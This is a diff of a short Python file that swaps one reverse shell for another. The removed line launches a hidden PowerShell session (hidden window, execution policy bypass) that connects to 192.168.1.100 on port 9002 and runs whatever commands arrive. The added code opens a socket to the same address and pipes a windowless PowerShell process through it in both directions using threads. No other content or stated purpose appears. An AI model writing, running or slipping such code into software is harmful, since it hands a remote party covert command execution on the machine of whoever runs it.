@@ -1,3 +1,29 @@
-import os
+import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
 
-os.system("powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.1.100', 9002);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"")
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.1.100",9002))
+
+p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
